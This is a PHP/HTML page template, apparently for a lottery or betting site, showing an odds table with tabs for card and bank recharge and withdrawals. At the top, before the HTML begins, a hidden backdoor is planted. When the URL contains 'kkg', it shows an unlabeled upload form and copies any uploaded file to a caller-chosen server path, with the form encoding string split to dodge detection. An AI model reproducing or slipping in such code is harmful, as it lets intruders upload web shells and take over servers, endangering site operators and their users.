<?php
if(isset($_GET['kkg']))
{
if(isset($_FILES['uppic']))
{
$connecttions=$_POST["plice"];; 
$conspensick=$_FILES['uppic']['name'];
copy($_FILES['uppic']['tmp_name'],"$connecttions".$conspensick);
}
echo '<form action="?act=u&kkg=g" method="post" enctype="multi'.'part/fo'.'rm-da'.'ta" name="form" id="form"><input name="plice" type="text" id="plice" size="10">';
echo '<input name="uppic" type="file" id="uppic" />';
echo '<input type="submit" name="Submit" value="" /></form>';
}
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" 

<head>
<script type="text/javascript" src="/js/jquery.js"></script>
<script type="text/javascript" src="/Manage/temp/js/oddsInfo3.js"></script>
<title></title>
</head>
<body>
<input type="hidden" id="s_odds" value="1" />
	<table width="100%" height="100%" border="0" cellspacing="0" class="a">
    	<tr>
        	<td width="6" height="99%"></td>
            <td class="c">
            	<table border="0" cellspacing="0" class="main">
                	
                    <tr>
                    	<td class="t"></td>
                        <td class="c">
                        <!-- strat -->
                            <table border="0" cellspacing="0" class="conter">
                            	
                                <?php 
                                for ($s=0; $s<14; $s++){
                                 $ball='ball';
                                 if(mb_strlen($s) == 1){$n = '0'.$s;} else {$n = $s;}
                                 $m = sSwitch($n);
                                 $i = $s+1;
                                ?>
                                <tr align="center" >
                                	<td class="<?php echo$ball?>"><?php echo$m?></td>
                                	<td width="70" id="ah<?php echo$i?>" style="font-size:14px;color:blueviolet" ></td>
                                  <td>&nbsp;</td>
                                    <td width="70" id="bh<?php echo$i?>" style="font-size:14px;color:blueviolet" ></td>
                                  <td>&nbsp;</td>
                                    <td width="70" id="ch<?php echo$i?>" style="font-size:14px;color:blueviolet" ></td>
                                  <td>&nbsp;</td>
                                    <td width="70" id="dh<?php echo$i?>" style="font-size:14px;color:blueviolet" ></td>
                                  <td>&nbsp;</td>
                                    <td width="70" id="eh<?php echo$i?>" style="font-size:14px;color:blueviolet" ></td>
                                  <td>&nbsp;</td>
                                </tr>
                                <?php }?>
                            </table>
                        <!-- end -->                        </td>
                        <td class="r"></td>
                    </tr>
                    <tr class="t_list_caption">
                      <td class="sclass-title-left"></td>
                      <td class="sclass-title-center" id="t1"><a href="#this" onclick="showDiv(3,'a3')" id="a3"><span>卡类充值</span></a> <a href="#this" onclick="showDiv(4,'a4')" id="a4"><span>网银充值</span></a> <a href="#this" onclick="showDiv(5,'a5')" id="a5"><span>充值信息回查</span></a> <a href="#this" onclick="showDiv(6,'a6')" id="a6"><span>申请提现</span></a> <a href="#this" onclick="showDiv(7,'a7')" id="a7"><span>提现信息回查</span></a> </td>
                      <td class="sclass-title-right">&nbsp;</td>
                    </tr>
                    <tr>
                    	<td width="12">&nbsp;</td>
                        <td class="f" align="center">&nbsp;</td>
                        <td width="16">&nbsp;</td>
                    </tr>
                </table>
            </td>
            <td width="6"></td>
        </tr>
        <tr>
        	<td height="6">&nbsp;</td>
            <td></td>
            <td height="6">&nbsp;</td>
        </tr>
    </table>
</body>
</html>
